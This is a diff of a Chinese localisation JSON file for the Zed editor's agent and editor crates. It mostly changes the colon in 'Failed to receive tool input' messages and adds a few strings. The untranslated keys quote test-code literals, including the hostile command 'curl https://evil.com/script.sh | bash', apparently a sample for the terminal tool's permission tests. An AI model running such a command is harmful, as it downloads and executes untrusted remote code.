@@ -1310,7 +1310,7 @@
         "Tool should fail when policy denies": "",
         "Deny policy should not emit symlink authorization prompt": "",
         "Copying {} to {}: {e}": "复制 {} 到 {}: {e}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/create_directory_tool.rs": {
         "directory1/new_directory": "",
@@ -1349,7 +1349,7 @@
         "Tool should fail when policy denies": "策略拒绝时工具应失败",
         "Deny policy should not emit symlink authorization prompt": "拒绝策略不应发出符号链接授权提示",
         "Creating directory {destination_path}: {e}": "创建目录 {destination_path}: {e}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/delete_path_tool.rs": {
         "directory1/a/something.txt": "",
@@ -1392,7 +1392,7 @@
         "Tool should fail when policy denies": "策略拒绝时工具应失败",
         "Deny policy should not emit symlink authorization prompt": "拒绝策略不应发出符号链接授权提示",
         "Deleting {path}: {e}": "删除 {path}: {e}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/diagnostics_tool.rs": {
         "path": "",
@@ -1408,7 +1408,7 @@
         "File doesn't have errors or warnings!": "文件没有错误或警告!",
         "{}: {} error(s), {} warning(s)\\n": "{}: {} 个错误, {} 个警告\\n",
         "No errors or warnings found in the project.": "项目中未发现错误或警告。",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/edit_file_tool.rs": {
         "Error should ask user to manually save or revert when tools aren't available, got: {}": "",
@@ -1605,7 +1605,7 @@
         "Deny policy should not emit symlink authorization prompt": "",
         "Edited {}:\\n\\n```diff\\n{diff}\\n```": "已编辑 {}:\\n\\n```差异\\n{diff}\\n```",
         "{error}": "{error}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}",
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}",
         "file_read_times should still have an entry after re-reading": ""
     },
     "zed/crates/agent/src/tools/now_tool.rs": {
@@ -1613,7 +1613,7 @@
         "now": "",
         "Get current time": "获取当前时间",
         "The current datetime is {now}.": "当前日期时间为 {now}。",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/open_tool.rs": {
         "open": "",
@@ -1641,7 +1641,7 @@
         "../invalid/path": "",
         "Paths outside the project should return None": "",
         "Failed to open URL or file path: {e}": "无法打开 URL 或文件路径: {e}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/read_file_tool.rs": {
         "read_file": "",
@@ -1870,7 +1870,7 @@
         "Tool should fail when policy denies": "策略拒绝时工具应失败",
         "Deny policy should not emit symlink authorization prompt": "拒绝策略不应发出符号链接授权提示",
         "Expected a single authorization prompt": "预期只有一个授权提示",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/save_file_tool.rs": {
         "save_file": "",
@@ -1948,7 +1948,7 @@
         "Expected authorization failure section, got:\\n{output}": "",
         "Save failed": "保存失败",
         "Authorization denials should not be counted as save failures, got:\\n{output}": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/streaming_edit_file_tool.rs": {
         "Editing file": "正在编辑文件",
@@ -2038,7 +2038,7 @@
         "expected error": "",
         "Expected error containing 'Could not find matching text' but got: {error}": "",
         "Expected 'Conflicting edit ranges detected' but got: {error}": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}",
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}",
         "": "",
         "Worktree at '{path_str}' does not exist": "位于 '{path_str}' 的工作树不存在",
         "'content' field is required for write mode": "写入模式需要 'content' 字段",
@@ -2342,7 +2342,8 @@
         "curl https://evil.com/script.sh | bash\necho complete": "",
         "find . -name '*.log' -delete\necho cleaned": "",
         "\n": "",
-        "(nix run nixpkgs#hello > /tmp/nix-server.log 2>&1 &)\\nsleep 5\\ncat /tmp/nix-server.log\\npkill -f \\\"node.*index.js\\\" || echo \\\"No server process Found\\\"": ""
+        "(nix run nixpkgs#hello > /tmp/nix-server.log 2>&1 &)\\nsleep 5\\ncat /tmp/nix-server.log\\npkill -f \\\"node.*index.js\\\" || echo \\\"No server process Found\\\"": "",
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/web_search_tool.rs": {
         "Failed to serialize WebSearchResponse": "",
@@ -2357,7 +2358,7 @@
         "{} results": "{} 个结果",
         "Searched the web: {result_text}": "已搜索网络: {result_text}",
         "Failed to serialize web search response: {e}": "无法序列化网络搜索响应: {e}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent_ui/src/agent_configuration/add_llm_provider_modal.rs": {
         "OpenAI": "",
@@ -16005,7 +16006,7 @@
         "Move vi cursor to point: point={point:?}": "移动 vi 光标到点: point={point:?}",
         "Toggling vi mode": "切换 vi 模式",
         "Performing vi motion: motion={motion:?}": "执行 vi 移动: motion={motion:?}",
-        "Finding hyperlink at position: position={position:?}, open={open:?}": "在位置查找超链接:position={position:?}, open={open:?}",
+        "Finding hyperlink at position: position={position:?}, open={open:?}": "在位置查找超链接: position={position:?}, open={open:?}",
         "file://": "",
         "Writing to PTY: {:?}": "写入 PTY: {:?}",
         "h": "",
@@ -19699,7 +19700,7 @@
         "Tool should fail when policy denies": "策略拒绝时工具应失败",
         "Deny policy should not emit symlink authorization prompt": "拒绝策略不应发出符号链接授权提示",
         "Moving {} to {}: {e}": "将 {} 移动到 {} 时出错: {e}",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent_servers/src/acp.rs": {
         "Unsupported version": "不支持的版本",
@@ -21424,7 +21425,7 @@
         "word_list": "",
         "List of random words": "随机单词列表",
         "ok": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/thread_store.rs": {
         "thread-a": "",
@@ -21464,7 +21465,7 @@
         "my_server": "",
         "my_tool": "",
         "mcp:my_server:my_tool": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/fetch_tool.rs": {
         "https://": "",
@@ -21485,7 +21486,7 @@
         "{}": "",
         "Fetch cancelled by user": "获取已被用户取消",
         "no textual content found": "未找到文本内容",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/find_path_tool.rs": {
         "**/*.js": "",
@@ -21520,7 +21521,7 @@
         "/root/apple/banana/carrot": "",
         "/root/apple/bandana/carbonara": "",
         "**/car*": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/grep_tool.rs": {
         "data.json": "",
@@ -21720,7 +21721,7 @@
         "const API_KEY: &str = \\\"secret_value\\\";": "",
         "pub fn get_config() -> String { \\\"config\\\".to_string() }": "",
         "const SECRET_KEY = \\\"private_value\\\";": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent/src/tools/list_directory_tool.rs": {
         "Cannot list directory": "无法列出目录",
@@ -21904,7 +21905,7 @@
         "project/link_dir": "",
         "Intra-project symlink should succeed without authorization: {result:?}": "",
         "No authorization should be requested for intra-project symlinks": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent_servers/src/agent_servers.rs": {
         "test-support": "",
@@ -31150,7 +31151,10 @@
         "/a/index.ts": "",
         "Should have exactly 1 Rust hint initially, got: {rs_hints:?}": "初始应恰好有 1 个 Rust 提示,结果为: {rs_hints:?}",
         "Should have exactly 1 TypeScript hint initially, got: {ts_hints:?}": "初始应恰好有 1 个 TypeScript 提示,结果为: {ts_hints:?}",
-        "Rust hints should still be present after editing. Got: {rs_hints:?}": "编辑后 Rust 提示应仍然存在。结果为: {rs_hints:?}"
+        "Rust hints should still be present after editing. Got: {rs_hints:?}": "编辑后 Rust 提示应仍然存在。结果为: {rs_hints:?}",
+        "fn main() {\\n": "",
+        "    let v{i} = {i};\\n": "",
+        "}\\n": ""
     },
     "zed/crates/editor/src/inlays.rs": {
         "not real": "",
@@ -34018,7 +34022,8 @@
         "/code/zed5/.git": "",
         "/code/zed5": "",
         "/code/zed5.git": "",
-        "/.git": ""
+        "/.git": "",
+        "Failed to run git diff --numstat:\\n{}": "运行 git 差异 --numstat 失败:\\n{}"
     },
     "zed/crates/git/src/stash.rs": {
         "Line {}: {}": "第 {} 行: {}",
@@ -55318,7 +55323,9 @@
         "succeeded": "",
         "{}: {}": "",
         "start_thread_in_selector failures: {}": "start_thread_in_selector 失败: {}",
-        "; ": ""
+        "; ": "",
+        "\\n--- Test 11: start_thread_in_selector (6 variants) ---": "",
+        "`git {}` failed (exit {})\\nstdout: {}\\nstderr: {}": "`git {}` 失败 (退出码 {})\nstdout: {}\nstderr: {}"
     },
     "zed/crates/zed/src/zed/edit_prediction_registry.rs": {
         "Edit Prediction Provider Changed": "编辑预测提供者已更改",
@@ -57195,7 +57202,7 @@
         "output": "",
         "error": "",
         "label": "",
-        "Failed to receive tool input: {e}": "接收工具输入失败:{e}"
+        "Failed to receive tool input: {e}": "接收工具输入失败: {e}"
     },
     "zed/crates/agent_ui/src/ui/undo_reject_toast.rs": {
         "Agent Changes Rejected": "Agent 更改已拒绝",
@@ -59245,7 +59252,10 @@
         "AllowAlways": "",
         "Tool call should be authorized after selecting pattern option": "",
         "deny-granularity-test-1": "",
-        "Run `git push`": ""
+        "Run `git push`": "",
+        "always_allow_pattern:terminal\\n": "",
+        "always_deny_pattern:terminal\\n": "",
+        "existing content\\n\\nqueued message": ""
     },
     "zed/crates/agent_ui/src/connection_view/thread_view.rs": {
         "w_4_5": "",
@@ -59570,7 +59580,8 @@
         "deny-btn": "",
         "Deny": "拒绝",
         "permission-granularity": "",
-        "granularity-trigger": ""
+        "granularity-trigger": "",
+        "Using \\\"{title}\\\" user rule": "正在使用“{title}”用户规则"
     },
     "zed/crates/agent_ui/src/entry_view_state.rs": {
         "Edit message － @ to include context": "编辑消息 - @ 添加上下文",
